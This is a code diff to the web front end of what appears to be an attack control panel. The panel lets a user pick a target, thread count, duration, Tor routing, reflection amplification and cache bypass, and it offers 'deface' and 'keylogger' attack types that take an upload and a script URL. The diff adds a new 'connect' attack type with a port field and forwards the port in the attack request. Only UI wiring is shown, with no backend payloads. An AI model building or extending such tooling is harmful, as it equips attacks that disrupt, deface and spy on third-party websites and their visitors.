@@ -332,6 +332,9 @@
         #keyloggerContainer {
             display: none;
         }
+        #connectContainer {
+            display: none;
+        }
 
     </style>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/3.3.2/jsencrypt.min.js"></script>
@@ -366,6 +369,11 @@
             <div id="keyloggerContainer">
                 <label for="keyloggerScript">Keylogger Script URL:</label>
                 <input type="text" id="keyloggerScript" name="keyloggerScript" placeholder="http://example.com/keylogger.js">
+            </div>
+
+            <div id="connectContainer">
+                <label for="connectPort">Connect Port:</label>
+                <input type="number" id="connectPort" name="connectPort" value="80">
             </div>
 
             <label for="duration">Duration (seconds):</label>
@@ -479,9 +487,11 @@
             var attackType = document.getElementById('attackType').value;
             var fileUploadContainer = document.getElementById('fileUploadContainer');
             var keyloggerContainer = document.getElementById('keyloggerContainer');
+            var connectContainer = document.getElementById('connectContainer');
 
             fileUploadContainer.style.display = (attackType === 'deface') ? 'block' : 'none';
             keyloggerContainer.style.display = (attackType === 'keylogger') ? 'block' : 'none';
+            connectContainer.style.display = (attackType === 'connect') ? 'block' : 'none';
         }
 
         async function initiateAttack() {
@@ -503,6 +513,7 @@
             const cacheBypass = document.getElementById('cacheBypass').checked;
             const fileUpload = document.getElementById('fileUpload').files[0];
             const keyloggerScript = document.getElementById('keyloggerScript').value;
+            const connectPort = parseInt(document.getElementById('connectPort').value);
 
             logMessage(`Initiating ${attackType} attack on ${target} for ${duration} seconds with ${threads} threads. Priority: ${priority}`);
 
@@ -523,7 +534,8 @@
                 torRouting,
                  reflectAmplification,
                 cacheBypass,
-                keyloggerScript
+                keyloggerScript,
+                connectPort
             };
 
             if (attackType === 'deface' && fileUpload) {
